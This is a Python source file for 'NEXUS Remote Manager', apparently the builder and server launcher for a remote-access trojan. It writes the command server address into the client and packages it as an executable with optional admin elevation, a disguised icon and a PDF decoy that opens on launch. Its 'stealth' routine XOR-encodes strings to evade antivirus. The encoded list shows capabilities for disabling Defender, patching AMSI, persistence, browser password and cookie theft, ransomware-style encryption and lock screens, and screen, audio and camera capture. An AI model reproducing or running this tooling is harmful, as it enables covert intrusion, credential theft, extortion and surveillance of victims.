#!/usr/bin/env python3
"""
NEXUS Remote Manager — Configure, build, and manage agents.
"""

import os, sys, platform, subprocess, threading, time, socket, shutil, argparse, json, re, base64
from pathlib import Path

CONFIG_FILE = "manager_config.json"

DEFAULTS = {
    "server_ip": "127.0.0.1",
    "server_port": "8080",
    "stream_port": "",
    "output_name": "agent",
    "console": False,
    "uac_admin": False,
    "icon": "",
    "upx": False,
    "onefile": True,
    "use_pdf": False,
    "pdf_path": "",
    "stealth": True,
}

import random as _random

SPEC_TEMPLATE = """# -*- mode: python ; coding: utf-8 -*-
a = Analysis(
    ['{client_file}'],
    pathex=[],
    binaries=[],
    datas={datas},
    hiddenimports=[],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)
exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='{output_name}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx={upx},
    upx_exclude=[],
    runtime_tmpdir=None,
    console={console},
    onefile={onefile},
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    {uac_line}
    {icon_line}
)
"""

LOADER_TEMPLATE = """import os, sys, subprocess, asyncio, concurrent.futures

# Open embedded PDF decoy
try:
    pdf = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    pdf = os.path.join(pdf, "{pdf_name}")
    if os.path.exists(pdf):
        if sys.platform == "win32":
            os.startfile(pdf)
        else:
            subprocess.Popen(["xdg-open", pdf])
except:
    pass

# Run agent
from client import main, enhanced_install_persistence, check_lock_state
enhanced_install_persistence()
check_lock_state()
_loop = asyncio.new_event_loop()
asyncio.set_event_loop(_loop)
_loop.set_default_executor(concurrent.futures.ThreadPoolExecutor(max_workers=16))
try:
    _loop.run_until_complete(main())
finally:
    try:
        _loop.run_until_complete(_loop.shutdown_asyncgens())
    except:
        pass
    _loop.close()
"""


def get_local_ips():
    ips = ["0.0.0.0", "127.0.0.1"]
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
            ip = info[4][0]
            if ip not in ips:
                ips.append(ip)
    except:
        pass
    return ips


class Manager:
    def __init__(self):
        self.config = dict(DEFAULTS)
        self._build_key = self._gen_key()
        self.load_config()

    def load_config(self):
        p = Path(CONFIG_FILE)
        if p.exists():
            try:
                with open(p) as f:
                    self.config.update(json.load(f))
            except:
                pass

    def save_config(self):
        with open(CONFIG_FILE, "w") as f:
            json.dump(self.config, f, indent=2)
        print("  [+] Config saved")

    def patch_client(self):
        src = Path("client.py").read_text(encoding="utf-8")
        src = re.sub(
            r'SERVER_IP = os\.environ\.get\("SERVER_IP", "[^"]*"\)',
            f'SERVER_IP = os.environ.get("SERVER_IP", "{self.config["server_ip"]}")',
            src,
        )
        src = re.sub(
            r'SERVER_PORT = int\(os\.environ\.get\("SERVER_PORT", os\.environ\.get\("PORT", "[^"]*"\)\)\)',
            f'SERVER_PORT = int(os.environ.get("SERVER_PORT", os.environ.get("PORT", "{self.config["server_port"]}")))',
            src,
        )
        if self.config.get("stream_port"):
            src = re.sub(
                r'_STREAM_UDP_PORT = .+',
                f'_STREAM_UDP_PORT = {self.config["stream_port"]}',
                src,
            )
        Path("client.py").write_text(src, encoding="utf-8")
        print(f"  [+] Patched client.py -> {self.config['server_ip']}:{self.config['server_port']}")
        if self.config.get("stream_port"):
            print(f"  [+] Stream UDP port -> {self.config['stream_port']}")

    def generate_spec(self, entry_point="client.py"):
        datas = []
        pdf_name = ""
        if self.config.get("use_pdf") and self.config.get("pdf_path"):
            pdf = self.config["pdf_path"]
            if os.path.exists(pdf):
                datas.append((pdf, "."))
                pdf_name = os.path.basename(pdf)
        datas_str = repr(datas)

        uac_line = ""
        if self.config["uac_admin"]:
            uac_line = "uac_admin=True,"
        icon_line = ""
        if self.config["icon"] and os.path.exists(self.config["icon"]):
            icon_line = f"icon=[r'{self.config['icon']}'],"

        spec = SPEC_TEMPLATE.format(
            client_file=entry_point,
            output_name=self.config["output_name"],
            datas=datas_str,
            upx=str(self.config["upx"]),
            console=str(self.config["console"]),
            onefile=str(self.config["onefile"]),
            uac_line=uac_line,
            icon_line=icon_line,
        )
        spec_file = f"build_{self.config['output_name']}.spec"
        Path(spec_file).write_text(spec)
        print(f"  [+] Generated {spec_file}")
        return spec_file

    def _gen_key(self):
        return bytes(_random.randrange(256) for _ in range(16))

    def _inject_key(self, src):
        key_str = self._build_key.hex()
        src = src.replace('b"OBFUSCATION_KEY_16BYTE"', f'bytes.fromhex("{key_str}")')
        return src

    def _xobf(self, s):
        k = self._build_key
        raw = bytes(ord(c) ^ k[i % len(k)] ^ (i & 0xFF) for i, c in enumerate(s))
        return base64.b64encode(raw).decode()

    def _gen_fn_name(self):
        import string
        letters = string.ascii_lowercase
        name = "_" + "".join(_random.choice(letters) for _ in range(2))
        while name in ("_s", "_ob", "_of", "_xb", "_id", "_is", "_in", "_or"):
            name = "_" + "".join(_random.choice(letters) for _ in range(2))
        return name

    _TRIGGER_STRINGS = [
        # — Defender / security products —
        "WinDefend", "Sense", "WdBoot", "WdFilter", "WdNisSvc", "MpPreference",
        "Add-MpPreference", "Set-MpPreference",
        "DisableAntiSpyware", "DisableRealtimeMonitoring", "DisableBehaviorMonitoring",
        "DisableBlockAtFirstSeen", "DisableIOAVProtection", "DisablePrivacyMode",
        "DisableArchiveScanning", "DisableIntrusionPreventionSystem", "DisableScriptScanning",
        "SignatureDisableUpdateOnStartupWithoutEngine", "SubmitSamplesConsent",
        # — AMSI / ETW patching —
        "AmsiScanBuffer", "EtwEventWrite", "VirtualProtect", "VirtualProtectEx",
        "WriteProcessMemory", "ReadProcessMemory", "NtQuerySystemInformation",
        "SystemHandleInformation", "NtQueryInformationProcess",
        # — Persistence names —
        "WinSvcUpdate", "WindowsServiceUpdater", "WinSvcUpdater",
        "WinSvcUpdateLogon", "WinSvcUpdatePeriodic", "WinSvcUpdateStartup",
        "WinSvcUpdateIdle", "Windows Service Update Manager",
        "Global\\WinSvcUpdate", "Software\\WinSvcUpdater", "SysLckDwn",
        "WinSvcHealthEvent", "WinSvcRestore",
        # — Browser credential harvesting —
        "Login Data", "Local State", "os_crypt", "encrypted_key",
        "Google\\Chrome", "Microsoft\\Edge", "BraveSoftware\\Brave-Browser",
        "origin_url", "username_value", "password_value", "host_key",
        "encrypted_value", "logins", "cookies",
        # — Crypto / ransomware —
        "do_encrypt", "do_decrypt", "harvest_passwords", "harvest_cookies",
        "_decrypt_chromium", "_get_browser_key",
        # — PowerShell / command patterns —
        "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand",
        "-Enc", "-WindowStyle Hidden", "powershell.exe", "pwsh",
        "Remove-WmiObject",
        # — Service control —
        "sc create", "sc config", "sc failure", "sc stop",
        "binPath=", "start= auto",
        # — schtasks —
        "schtasks /create", "/sc onlogon", "/sc minute", "/sc onstart", "/sc onidle",
        # — WMI —
        "__EventFilter", "CommandLineEventConsumer", "__FilterToConsumerBinding",
        "SELECT * FROM __InstanceModificationEvent",
        "root\\subscription", "Win32_PerfFormattedData_PerfOS_System",
        # — Process/memory —
        "kernel32", "ntdll", "advapi32", "CreateMutexW", "GetProcAddress",
        "LoadLibraryW", "CloseHandle", "GetLastError",
        # — Misc commands —
        "os.startfile", "xdg-open", "wscript.exe",
        "run_until_complete", "shutdown_asyncgens",
        # — Lock screen —
        "SYSTEM LOCKED", "ENTER PIN", "fullscreen", "topmost", "overrideredirect",
        "SYSTEM SECURITY", "REMOTE SECURITY SESSION",
        # — Hidden copies —
        "WinSvcCopy", "SysCache", "attrib +h", ".syslck",
        # — Lock status file/recovery —
        "SYSTEM LOCKED", "ENTER PIN", "SYSTEM SECURITY", "REMOTE SECURITY SESSION",
        # — USB / external input disable —
        # — Audio / screen capture —
        "Stereo Mix", "What U Hear", "Wave Out Mix", "loopback",
        "sounddevice", "pyaudio", "DirectShow",
        # — Network indicators —
        "websockets", "WebSocket", "ws://", "wss://",
        "/ws/client", "/ws/client_cam",
        # — HID / input —
        "do_move", "do_click", "do_key", "MouseController", "KeyboardController",
        "mousemove", "mousedown", "mouseup",
        # — Frame / streaming —
        "createImageBitmap", "drawImage", "image/jpeg", "image/png",
        "frame_interval", "min_quality", "max_quality", "quality_adj",
        "_grab_screen_jpeg", "stream_loop", "camera_loop",
        # — Thread / process —
        "ThreadPoolExecutor", "asyncio.to_thread", "daemon=True",
        "set_event_loop", "new_event_loop",
        # — Memory / patching —
        "NtQuerySystemInformation", "SystemHandleInformation", "VirtualQuery",
        "VirtualProtect", "WriteProcessMemory", "ReadProcessMemory",
        # — Common globals —
        "DEVICE_ID", "HOSTNAME", "SERVER_IP", "SERVER_PORT",
    ]

    def _obfuscate_client(self):
        backup = Path("client.py.bak")
        orig = Path("client.py")
        if backup.exists():
            orig.write_text(backup.read_text("utf-8"), "utf-8")
        else:
            backup.write_text(orig.read_text("utf-8"), "utf-8")

        if not self.config.get("stealth"):
            return

        self._build_key = self._gen_key()
        src = orig.read_text("utf-8")
        src = self._inject_key(src)

        changed = 0
        fn_repl = self._gen_fn_name()
        for plain in self._TRIGGER_STRINGS:
            obf = self._xobf(plain)
            count = src.count(f'"{plain}"')
            if count:
                src = src.replace(f'"{plain}"', f'{fn_repl}("{obf}")')
                changed += count

        # Rename _s() function definition + all calls to random name
        src = src.replace("def _s(blob)", f"def {fn_repl}(blob)")
        src = src.replace("_s(", f"{fn_repl}(")

        if changed:
            orig.write_text(src, "utf-8")
            print(f"  [+] Obfuscated {changed} strings (fn: {fn_repl}, key: {self._build_key.hex()[:8]}...)")
        else:
            print("  [-] No trigger strings to obfuscate")

    def _find_pyinstaller(self):
        candidates = ["pyinstaller", "pyinstaller3"]
        for c in candidates:
            if shutil.which(c):
                return [c]
        try:
            subprocess.run(
                [sys.executable, "-m", "PyInstaller", "--version"],
                capture_output=True, timeout=10,
            )
            return [sys.executable, "-m", "PyInstaller"]
        except:
            return None

    def build_agent(self):
        print("\n--- Building Standalone Agent ---")
        self._obfuscate_client()
        self.patch_client()

        entry = "client.py"
        use_pdf = self.config.get("use_pdf") and self.config.get("pdf_path") and os.path.exists(self.config["pdf_path"])
        if use_pdf:
            pdf_name = os.path.basename(self.config["pdf_path"])
            loader = LOADER_TEMPLATE.format(pdf_name=pdf_name)
            Path("client_loader.py").write_text(loader)
            entry = "client_loader.py"
            print(f"  [+] Created client_loader.py (PDF: {pdf_name})")

        spec = self.generate_spec(entry_point=entry)

        pyinst = self._find_pyinstaller()
        if not pyinst:
            print("  [X] PyInstaller not installed. Run: pip install pyinstaller")
            return

        print(f"  Running PyInstaller...")
        cmd = pyinst + ["--noconfirm", spec]

        result = subprocess.run(cmd, capture_output=True, timeout=600)
        if result.returncode == 0:
            ext = ".exe" if platform.system() == "Windows" else ""
            exe_path = os.path.join("dist", self.config["output_name"] + ext)
            if os.path.exists(exe_path):
                size = os.path.getsize(exe_path) / 1024 / 1024
                print(f"  [+] Build OK -> {exe_path} ({size:.1f} MB)")
            else:
                print("  [!] Build OK but exe not found in dist/")
        else:
            print("  [X] Build failed:")
            print(result.stderr.decode()[-1500:])

    def _ensure_deps(self, packages):
        missing = []
        for pkg in packages:
            try:
                __import__(pkg)
            except ImportError:
                missing.append(pkg)
        if not missing:
            return True
        print(f"  [!] Missing server deps: {', '.join(missing)}")
        ans = input("  Install now? [Y/n]: ").strip().lower()
        if ans == "n":
            return False
        for pkg in missing:
            pip_name = pkg
            if pkg in ("cryptography",):
                pip_name = "pycryptodome"
            print(f"  Installing {pip_name}...")
            r = subprocess.run(
                [sys.executable, "-m", "pip", "install", pip_name],
                capture_output=True, timeout=120,
            )
            if r.returncode != 0:
                print(f"  [X] Failed to install {pip_name}: {r.stderr.decode()[-200:]}")
                return False
        print("  [+] Dependencies installed")
        return True

    def start_server(self, ip=None, port=None):
        print("\n--- Starting Server ---")
        ip = ip or self.config["server_ip"]
        port = port or self.config["server_port"]
        if not self._ensure_deps(["fastapi", "uvicorn", "websockets"]):
            return
        self._kill_port(port)
        env = {**os.environ, "HOST": ip, "PORT": str(port)}
        p = subprocess.Popen(
            [sys.executable, "server.py"], env=env,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )
        time.sleep(2)
        if p.poll() is None:
            print(f"  [+] Server running on http://{ip}:{port}")
        else:
            _, err = p.communicate()
            print(f"  [X] Failed: {err.strip()[:500]}")

    def stop_server(self):
        print("\n--- Stopping Server ---")
        self._kill_port(self.config["server_port"])
        print("  [+] Done")

    def _kill_port(self, port):
        try:
            if platform.system() == "Windows":
                out = subprocess.check_output(
                    f'netstat -ano | findstr :{port} | findstr LISTEN',
                    shell=True, text=True,
                )
                for line in out.strip().split("\n"):
                    parts = line.split()
                    if parts and parts[-1].isdigit():
                        subprocess.run(["taskkill", "/F", "/PID", parts[-1], "/T"],
                                       capture_output=True)
            else:
                try:
                    out = subprocess.check_output(["lsof", "-ti", f":{port}"], text=True)
                    for pid in out.strip().split("\n"):
                        if pid:
                            subprocess.run(["kill", "-9", pid])
                except:
                    pass
        except:
            pass

    def show_menu(self):
        os.system("cls" if os.name == "nt" else "clear")
        c = self.config
        print("=== NEXUS Remote Manager ===\n")
        items = [
            ("1", "Server IP", c["server_ip"]),
            ("2", "Server Port (HTTP)", c["server_port"]),
            ("P", "Stream UDP Port", c["stream_port"] or "(default 1000)"),
            ("3", "Output exe name", c["output_name"]),
            ("4", "Console window", "Yes" if c["console"] else "No"),
            ("5", "UAC Admin", "Yes" if c["uac_admin"] else "No"),
            ("6", "Icon file", c["icon"] or "(none)"),
            ("7", "UPX compress", "Yes" if c["upx"] else "No"),
            ("8", "Single file", "Yes" if c["onefile"] else "No"),
            ("9", "PDF decoy", "Yes" if c["use_pdf"] else "No"),
            ("0", "Stealth obfuscation", "Yes" if c["stealth"] else "No"),
        ]
        for k, label, val in items:
            print(f"  [{k}] {label:17s} {val}")
        print(f"\n  [S] Start server    [T] Stop server")
        print(f"  [B] BUILD agent     [C] Show config")
        print(f"  [Q] Quit")
        return input("\n  Choice: ").strip().lower()

    def edit(self, prompt, current=""):
        v = input(f"  {prompt} [{current}]: ").strip()
        return v if v else current

    def _pick_interface(self):
        ips = get_local_ips()
        print("\n  Available network interfaces:")
        for i, ip in enumerate(ips):
            mark = " (current)" if ip == self.config["server_ip"] else ""
            print(f"    [{i}] {ip}{mark}")
        print(f"    [C] Custom IP")
        print(f"    [Enter] Keep current ({self.config['server_ip']})")
        ch = input("  Choose interface: ").strip().lower()
        if ch == "c":
            return input("  Enter custom IP: ").strip() or self.config["server_ip"]
        if ch.isdigit() and int(ch) < len(ips):
            return ips[int(ch)]
        return self.config["server_ip"]

    def run(self):
        while True:
            ch = self.show_menu()
            c = self.config
            if ch == "1":
                c["server_ip"] = self.edit("Server IP", c["server_ip"])
            elif ch == "2":
                c["server_port"] = self.edit("Port", c["server_port"])
            elif ch == "p":
                v = input(f"  Stream UDP port [{c['stream_port'] or 'auto'}]: ").strip()
                c["stream_port"] = v
            elif ch == "3":
                c["output_name"] = self.edit("Output name", c["output_name"])
            elif ch == "4":
                c["console"] = not c["console"]
            elif ch == "5":
                c["uac_admin"] = not c["uac_admin"]
            elif ch == "6":
                v = input(f"  Icon path [{c['icon'] or 'none'}]: ").strip()
                if v:
                    if os.path.exists(v):
                        c["icon"] = v
                    else:
                        print("  [!] File not found")
                else:
                    c["icon"] = ""
            elif ch == "7":
                c["upx"] = not c["upx"]
            elif ch == "8":
                c["onefile"] = not c["onefile"]
            elif ch == "9":
                c["use_pdf"] = not c["use_pdf"]
                if c["use_pdf"]:
                    v = input(f"  PDF path [{c['pdf_path'] or 'none'}]: ").strip()
                    if v:
                        if os.path.exists(v):
                            c["pdf_path"] = v
                        else:
                            print("  [!] File not found")
                    elif not c["pdf_path"]:
                        c["use_pdf"] = False
            elif ch == "0":
                c["stealth"] = not c["stealth"]
            elif ch == "s":
                self.save_config()
                ip = self._pick_interface()
                port = input(f"  Port [{self.config['server_port']}]: ").strip() or self.config["server_port"]
                self.config["server_ip"] = ip
                self.config["server_port"] = port
                self.save_config()
                self.start_server(ip=ip, port=port)
                input("\n  Press Enter...")
            elif ch == "t":
                self.stop_server()
                input("\n  Press Enter...")
            elif ch == "b":
                self.save_config()
                self.build_agent()
                input("\n  Press Enter...")
            elif ch == "c":
                print("\n--- Config ---")
                for k, v in c.items():
                    print(f"  {k}: {v}")
                input("\n  Press Enter...")
            elif ch == "q":
                self.save_config()
                print("Bye")
                break


def main():
    parser = argparse.ArgumentParser(description="NEXUS Remote Manager")
    parser.add_argument("--build", metavar="IP:PORT", help="Build agent for IP:PORT and exit")
    parser.add_argument("--name", default="agent", help="Output exe name (with --build)")
    parser.add_argument("--console", action="store_true", help="Show console window")
    parser.add_argument("--uac", action="store_true", help="Request UAC admin")
    parser.add_argument("--icon", help="Icon .ico file")
    parser.add_argument("--stealth", action="store_true", help="Enable string obfuscation")
    parser.add_argument("--no-stealth", action="store_true", help="Disable string obfuscation")
    parser.add_argument("--stream-port", help="UDP stream port (default: HTTP port + 1000)")
    args = parser.parse_args()

    m = Manager()
    if args.no_stealth:
        m.config["stealth"] = False
    if args.stealth:
        m.config["stealth"] = True
    if args.stream_port:
        m.config["stream_port"] = args.stream_port
    if args.build:
        if ":" in args.build:
            ip, port = args.build.split(":", 1)
            m.config["server_ip"] = ip
            m.config["server_port"] = port
        else:
            m.config["server_ip"] = args.build
        m.config["output_name"] = args.name
        m.config["console"] = args.console
        m.config["uac_admin"] = args.uac
        if args.icon:
            m.config["icon"] = args.icon
        m.build_agent()
    else:
        m.run()


if __name__ == "__main__":
    main()
